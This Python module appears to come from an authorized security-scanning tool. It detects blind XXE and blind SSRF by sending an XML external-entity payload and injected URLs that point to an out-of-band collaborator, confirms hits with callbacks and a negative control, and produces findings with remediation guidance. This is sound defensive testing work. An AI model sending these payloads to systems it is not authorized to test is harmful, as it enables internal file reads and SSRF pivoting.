"""Blind SSRF detection via the OOB collaborator (out-of-band, deterministic)."""
from __future__ import annotations

from ..schemas.finding import CVSS, Finding, Remediation, Reproduction, State, Verification
from ..util import now_iso

_SSRF_PARAMS = ("url", "uri", "webhook", "callback", "fetch", "target", "dest", "endpoint",
                "feed", "link", "next", "proxy")

_CVSS = CVSS(version="4.0", base_score=8.2, severity="high",
             vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:N/SA:N",
             v31_fallback={"base_score": 8.6, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"})


def _candidates(appmodel):
    out = []
    for e in appmodel.endpoints:
        if (e.method or "GET").upper() != "GET":
            continue
        for p in (e.parameters or []):
            if p.get("in") == "query" and (p.get("name") or "").lower() in _SSRF_PARAMS:
                out.append((e.path, p["name"]))
    return out


_XXE_PATH_HINTS = ("import", "xml", "upload", "parse", "soap", "feed", "ingest", "document", "data")


def blind_xxe_scan(runner, collaborator, appmodel, target_url, application="target",
                   timeout: float = 3.0) -> list[Finding]:
    """POST an XML external-entity payload pointing at the collaborator; a callback confirms XXE."""
    findings = []
    eps = [e for e in appmodel.endpoints if (e.method or "GET").upper() in ("POST", "PUT")
           and any(h in e.path.lower() for h in _XXE_PATH_HINTS)]
    for ep in eps:
        token, oob_url = collaborator.new_token()
        xml = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{oob_url}">]><r>&xxe;</r>')
        probe = runner.post(ep.path, xml, content_type="application/xml", payload_class="boundary-probe",
                            rationale="blind-XXE: external entity to OOB collaborator", summary="xxe probe")
        if not probe.executed or not collaborator.wait_for(token, timeout=timeout):
            continue
        ctrl_token, _ = collaborator.new_token()
        if collaborator.wait_for(ctrl_token, timeout=0.3):   # a never-injected token must stay clean
            continue
        f = Finding(
            engagement_id=runner.engagement_id,
            title=f"Blind XXE via XML external entity on {ep.method} {ep.path} (out-of-band confirmed)",
            vuln_class="XXE", severity="high", confidence="confirmed", state=State.VALIDATED,
            cwe=["CWE-611"], owasp={"web_2025": ["A05:2021-Security Misconfiguration"],
                                    "api_2023": ["API8:2023-Security Misconfiguration"]},
            cvss=CVSS(version="4.0", base_score=8.2, severity="high",
                      vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:N/SA:N"),
            asset={"type": "api_endpoint", "application": application, "environment": "authorized",
                   "target": target_url},
            endpoint={"method": ep.method, "url": f"{target_url}{ep.path}", "auth_required": False},
            description=(f"{ep.method} {ep.path} resolves XML external entities; a declared SYSTEM entity "
                         "caused an outbound request to an attacker-controlled collaborator (blind XXE)."),
            impact="Read internal files / SSRF to internal services / exfiltrate data via out-of-band channels.",
            root_cause="The XML parser resolves external entities (DTD/SYSTEM) on untrusted input.",
            reproduction=Reproduction(prerequisites=["An OOB collaborator reachable from the target"],
                                      steps=[f"POST XML with <!ENTITY … SYSTEM \"<collaborator>/<token>\"> to {ep.path}",
                                             "Observe an inbound callback for that token"],
                                      deterministic=True),
            remediation=Remediation(summary="Disable DTD/external-entity resolution in the XML parser.",
                                    type="code_patch",
                                    guidance=("Disable DOCTYPE/DTDs and external entities (e.g. defusedxml, "
                                              "FEATURE_SECURE_PROCESSING, resolve_entities=False) (CWE-611)."),
                                    effort="low"),
            references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                        "https://cwe.mitre.org/data/definitions/611.html"],
            compliance_control_refs=["SOC2:CC6.6", "ISO27001:A.8.26"],
            dedupe_key=f"{application}:{ep.method}:{ep.path}:xxe", tags=["xxe", "blind", "out-of-band"],
            verification=Verification(method="out-of-band-collaborator", validated=True, validated_at=now_iso(),
                                      validator="oob-collaborator", independent_reproduction=True, reproductions=1,
                                      false_positive_checks=[f"collaborator received a callback for token {token[:12]}…",
                                                             "negative control token received NO callback"],
                                      confidence_score=0.97))
        f.evidence.extend(probe.evidence)
        f.assert_consistent()
        findings.append(f)
    return findings


def blind_ssrf_scan(runner, collaborator, appmodel, target_url, application="target",
                    timeout: float = 3.0) -> list[Finding]:
    """For each SSRF-shaped parameter, inject a unique collaborator URL and confirm a callback."""
    findings = []
    for path, param in _candidates(appmodel):
        token, oob_url = collaborator.new_token()
        probe = runner.get(path, session=None, query={param: oob_url}, payload_class="boundary-probe",
                           rationale="blind-SSRF: inject an OOB collaborator URL", summary="blind-ssrf probe")
        if not probe.executed:
            continue
        hit = collaborator.wait_for(token, timeout=timeout)
        if not hit:
            continue
        # negative control: a token we never inject must never be called back
        ctrl_token, _ = collaborator.new_token()
        control_clean = not collaborator.wait_for(ctrl_token, timeout=0.3)
        if not control_clean:
            continue
        f = Finding(
            engagement_id=runner.engagement_id,
            title=f"Blind SSRF via '{param}' on GET {path} (out-of-band confirmed)",
            vuln_class="SSRF", severity="high", confidence="confirmed", state=State.VALIDATED,
            cwe=["CWE-918"], owasp={"web_2025": ["A10:2025-Server-Side Request Forgery"],
                                    "api_2023": ["API7:2023-SSRF"]},
            cvss=_CVSS,
            asset={"type": "api_endpoint", "application": application, "environment": "authorized",
                   "target": target_url},
            endpoint={"method": "GET", "url": f"{target_url}{path}",
                      "parameters": [{"name": param, "in": "query"}], "auth_required": False},
            description=(f"The '{param}' parameter on GET {path} caused the server to make an outbound "
                         "request to an attacker-controlled collaborator (no response signal — blind SSRF)."),
            impact="Reach internal services / cloud metadata with no visible response; pivot internally.",
            root_cause="A user-controlled URL is fetched server-side without allow-listing.",
            reproduction=Reproduction(
                prerequisites=["An OOB collaborator reachable from the target"],
                steps=[f"Send GET {path} with {param}=<collaborator-url>/<token>",
                       "Observe an inbound callback to the collaborator for that token"],
                deterministic=True),
            remediation=Remediation(
                summary="Allow-list outbound destinations; block internal/link-local and metadata IPs.",
                type="code_patch",
                guidance=("Validate the URL scheme/host against an allow-list, resolve and reject private/"
                          "link-local/metadata ranges, disable redirects, and egress via a controlled proxy "
                          "(CWE-918)."),
                effort="medium"),
            references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                        "https://cwe.mitre.org/data/definitions/918.html"],
            compliance_control_refs=["SOC2:CC6.6", "ISO27001:A.8.22"],
            dedupe_key=f"{application}:GET:{path}:{param}:blind-ssrf",
            tags=["ssrf", "blind", "out-of-band"],
            verification=Verification(
                method="out-of-band-collaborator", validated=True, validated_at=now_iso(),
                validator="oob-collaborator", independent_reproduction=True, reproductions=1,
                false_positive_checks=[f"collaborator received a callback for token {token[:12]}…",
                                       "negative control token received NO callback"],
                confidence_score=0.97))
        f.evidence.extend(probe.evidence)
        f.assert_consistent()
        findings.append(f)
    return findings
